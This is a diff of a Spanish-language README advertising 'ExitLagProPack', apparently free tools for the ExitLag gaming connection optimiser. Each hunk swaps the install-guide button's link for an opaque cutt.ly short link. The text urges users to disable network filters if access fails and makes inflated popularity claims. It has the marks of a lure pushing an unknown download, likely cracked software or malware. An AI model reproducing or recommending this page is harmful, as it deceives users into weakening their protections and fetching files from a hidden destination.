@@ -6,7 +6,7 @@
 
 **Acerca de ExitLagProPack**: ExitLagProPack es un repositorio para usuarios de *ExitLag V4.305.1* en Windows, con herramientas y configuraciones gratuitas para optimizar conexiones de juego. Reduce latencia, ping y pérdida de paquetes para una experiencia fluida. Con 170K+ visitantes y 140K+ miembros, ¡potencia tus partidas hoy! 
 
- <a href="https://exitlag-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/1rNrZYl0" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Install Guide Now" width="230" height="60" style="border:none;">
 </a>
 
@@ -22,7 +22,7 @@ Mejora tu *ExitLag V4.305.1* con **ExitLagProPack** en Windows:
 2. **Soluciona Problemas de Acceso** 🌐  
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
- <a href="https://exitlag-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/1rNrZYl0" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Install Guide Now" width="230" height="60" style="border:none;">
 </a>
 
@@ -35,7 +35,7 @@ Mejora tu *ExitLag V4.305.1* con **ExitLagProPack** en Windows:
 - 🤝 **Comunidad Activa**: Conecta con 140K+ miembros.  
 - 📅 **Actualizaciones Frecuentes**: Nuevas herramientas para tus juegos.
 
- <a href="https://exitlag-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/1rNrZYl0" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Install Guide Now" width="230" height="60" style="border:none;">
 </a>
 
